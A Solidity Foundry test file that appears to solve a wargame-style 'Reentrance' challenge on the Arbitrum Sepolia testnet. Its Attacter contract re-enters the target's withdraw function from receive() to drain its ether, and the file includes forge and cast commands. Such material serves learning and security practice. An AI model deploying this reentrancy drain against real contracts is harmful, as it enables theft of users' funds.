// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
// import {Reentrance} from "../src/Reentrance.sol";

// cast interface src/Reentrance.sol:Reentrance
interface IReentrance {
    function balanceOf(address _who) external view returns (uint256 balance);
    function balances(address) external view returns (uint256);
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract Exp is Test {
    IReentrance public contractInstance;
    address deployer = makeAddr("deployer"); // 0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946
    address attacker = makeAddr("attacker"); // 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e
    uint256 inicialPrize = 1 ether;
    uint256 startFunds = 100 ether;

    function setUp() public {
        vm.deal(attacker, startFunds);
        uint256 chainId = block.chainid;
        console2.log("Chain ID:", chainId);

        if (chainId == 421614) {
            // ARBITRUM_SEPOLIA_RPC_URL
            contractInstance = IReentrance(payable(0x8D8F944A3DbBE9678223200371C662318E218038));
        } else {
            return;
        }
    }

    // forge test --mt testReentranceWithdraw --fork-url $ARBITRUM_SEPOLIA_RPC_URL -vvvvv
    // cast storage 0x8D8F944A3DbBE9678223200371C662318E218038 0 --rpc-url $SEPOLIA_RPC_URL
    // cast balance 0x8D8F944A3DbBE9678223200371C662318E218038 --rpc-url $ARBITRUM_SEPOLIA_RPC_URL
    function testReentranceWithdraw() public {
        console2.log("Running in testUnlokeVault...");
        vm.startPrank(attacker); // Set msg.sender to the attacker address
        assertEq(contractInstance.balanceOf(address(attacker)), 0);
        assertEq(attacker.balance, startFunds);
        assertEq(address(contractInstance).balance, 1000000000000000);

        contractInstance.donate{value: inicialPrize}(attacker);

        assertEq(contractInstance.balanceOf(address(attacker)), inicialPrize);
        assertEq(attacker.balance, startFunds - inicialPrize);
        assertEq(address(contractInstance).balance, inicialPrize + 1000000000000000);

        Attacter attackerInstance = new Attacter(payable(address(contractInstance)));

        assertEq(address(attackerInstance).balance, 0);
        assertEq(contractInstance.balanceOf(address(attackerInstance)), 0);

        attackerInstance.attack{value: inicialPrize}();

        console2.log("attacker ETH balance is ", attacker.balance);
        console2.log("attacker contract balance is ", contractInstance.balanceOf(attacker));
        console2.log("contractInstance ETH balance is ", address(contractInstance).balance);
        console2.log("attackerContract ETH balance is ", address(attackerInstance).balance);
        attackerInstance.withdrawAll();
        console2.log("attacker ETH balance after withdraw is ", attacker.balance);
        vm.stopPrank();
    }
}

contract Attacter {
    IReentrance public targetContract;
    address public owner;

    constructor(address payable _contractInstance) payable {
        targetContract = IReentrance(_contractInstance);
        owner = msg.sender;
    }

    function attack() public payable {
        require(msg.value >= 1 ether, "need at least 1 ether");
        targetContract.donate{value: 1 ether}(address(this));
        targetContract.withdraw(1 ether);
    }

    function withdrawAll() external {
        payable(owner).transfer(address(this).balance);
    }

    // 接收 ETH 并进行重入
    receive() external payable {
        uint256 balance = address(targetContract).balance;
        if (balance >= 1 ether) {
            targetContract.withdraw(1 ether);
        } else if (balance > 0) {
            targetContract.withdraw(balance);
        }
    }
}
